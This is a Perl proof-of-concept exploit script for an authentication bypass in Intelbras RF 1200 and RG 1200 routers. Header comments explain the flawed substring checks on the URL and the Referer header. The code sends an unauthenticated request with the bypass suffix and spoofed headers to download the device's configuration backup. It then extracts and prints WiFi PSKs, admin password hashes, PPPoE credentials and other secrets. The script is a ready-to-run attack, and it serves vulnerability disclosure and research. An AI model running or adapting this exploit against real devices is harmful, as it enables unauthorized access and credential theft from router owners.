#!/usr/bin/perl
# PoC.pl - Intelbras RF 1200 / RG 1200 — Universal Authentication Bypass.
# https://github.com/gabrielunknown/intelbras_1200_bypass
# Root cause: strstr(full_url, "img/main-logo.png") auth bypass
#
# Affected:
#   Intelbras RF 1200  firmware v1.2.4
#   Intelbras RG 1200  firmware v2.1.9
#
# Impact:
#   Any unauthenticated client on the LAN can download the full device
#   configuration backup, which contains WiFi PSKs, admin credentials (MD5),
#   PPPoE credentials and other sensitive settings — without supplying any
#   username or password.
#
# CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  Base Score 7.5
#
# Root cause (binary: /bin/httpd, GoAhead web server):
#
#   R7WebsSecurityHandler() performs authentication using:
#
#     if (strstr(full_url, "img/main-logo.png") != NULL) { ALLOW; }
#
#   full_url includes the complete request URI with query string. Appending
#   ?img/main-logo.png to any endpoint causes strstr() to return non-null,
#   granting access without credentials to every goform handler and CGI endpoint.
#
# The same function also calls check_CSRF_attack(), which validates the Referer
# header via:
#
#     strstr(referer, "meuintelbras")
#
#   Sending Referer: http://meuintelbras.local (and Origin: http://meuintelbras.local)
#   satisfies this substring check. Both headers are included below.
#
# Usage:
#   perl poc.pl <target>              # e.g. perl poc.pl 10.0.0.1
#   perl poc.pl <target> <outfile>    # e.g. perl poc.pl 10.0.0.1 cfg.bin
#
#
#   Unauthorized use against systems you do not own or lack explicit written authorization
#   to test is illegal in virtually every jurisdiction and may result in criminal prosecution under computer misuse laws,
#   the author and contributors of this tool assume no liability for any misuse or damage caused by this software.

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;

my $target  = $ARGV[0] or do { print "Usage: perl poc.pl <target> [outfile]\n"; exit 1 };
my $outfile = $ARGV[1] // sprintf("intelbras_config_%d.bin", time());
my $base    = "http://$target";

my $BYPASS = '?img/main-logo.png';

my $ua = LWP::UserAgent->new(
    timeout => 10,
    agent   => 'Mozilla/5.0 (X11; Linux x86_64)',
);

printf "[*] Target   : %s\n",   $target;
printf "[*] Endpoint : GET %s/cgi-bin/DownloadCfg%s\n", $base, $BYPASS;
printf "[*] Referer  : http://meuintelbras.local\n";
printf "[*] Origin   : http://meuintelbras.local\n";
print  "[*] Auth     : NONE (BYPASS)\n";
print  "─" x 60 . "\n";

my $req = HTTP::Request->new('GET', "$base/cgi-bin/DownloadCfg$BYPASS");
$req->header('Referer', 'http://meuintelbras.local');
$req->header('Origin',  'http://meuintelbras.local');

my $res = $ua->request($req);

printf "[*] HTTP %s  (%d bytes)\n", $res->code, length($res->content // '');

unless ($res->code == 200 && length($res->content // '') > 0) {
    printf "[-] No response — device may be patched or unreachable (HTTP %s)\n", $res->code;
    exit 1;
}

open(my $fh, '>', $outfile) or die "Cannot write $outfile: $!";
binmode $fh;
print $fh $res->content;
close $fh;
printf "[+] Configuration backup saved: %s (%d bytes)\n", $outfile, length($res->content);

my @hits;
my $data = $res->content;
while ($data =~ /([A-Za-z0-9_.]{2,40})=([^\x00\x0a\x0d]{4,64})/g) {
    my ($k, $v) = ($1, $2);
    next if $v =~ /[^\x20-\x7e]/;
    push @hits, [$k, $v] if $k =~ /pass|psk|key|secret|token|pwd/i
                          || $v =~ /^[a-f0-9]{32}$/;
}

if (@hits) {
    printf "[+] %d sensitive value(s) found in plaintext:\n", scalar @hits;
    printf "    %-35s = %s\n", $_->[0], $_->[1] for @hits;
} else {
    print "[*] No plaintext credentials found in initial scan.\n";
    printf "[*] Further analysis: strings -n 6 %s | grep -iE 'pass|psk|key'\n", $outfile;
}

print "[+] Done.\n";
